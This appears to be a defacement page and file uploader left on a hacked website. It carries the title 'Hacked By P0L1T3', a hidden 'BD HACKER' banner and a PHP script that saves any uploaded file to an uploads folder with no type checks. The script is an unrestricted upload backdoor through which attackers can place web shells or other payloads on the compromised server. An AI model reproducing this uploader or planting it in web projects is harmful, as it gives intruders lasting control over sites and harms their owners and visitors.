<span style="position: absolute; color: transparent;">

   _______    ______    ___        ____  ___________  _______
  |   __ "\  /    " \  |"  |      /  " \("     _   ")/" __   )
  (. |__) :)// ____  \ ||  |     /__|| | )__/  \\__/(__/ _) ./
  |:  ____//  /    ) :)|:  |        |: |    \\_ /       /  //
  (|  /   (: (____/ //  \  |___    _\  |    |.  |    __ \_ \\
 /|__/ \   \        /  ( \_|:  \  /" \_|\   \:  |   (: \__) :\
(_______)   \"_____/    \_______)(_______)   \__|    \_______)


                                        [BD HACKER]
</span>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>!!Hacked By P0L1T3!!</title>
</head>

<body style="padding: 0; margin: 0; background-color: #000000; color: #000000; text-align: center; ">
<form action="upload.php" method="post" enctype="multipart/form-data" style="background-color: rgb(255, 255, 255); padding: 20px; border: 3px dashed rgb(255, 0, 0)" >
  <div style=" border: 1px dashed rgb(255, 0, 0); padding: 10px;">
    <i>Select <u><b>files</b></u> to upload:</i>
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload" name="submit" style="background-color: transparent;  border: 2px solid #000000; border-radius: 20px;  color: #000000;  padding: 8px 16px;  text-decoration: none;  cursor: pointer;">
  </div>
</form>

</body>
</html>

<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));


// Check if file already exists
if (file_exists($target_file)) {
  echo "Sorry, file already exists.";
  $uploadOk = 0;
}


// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?>
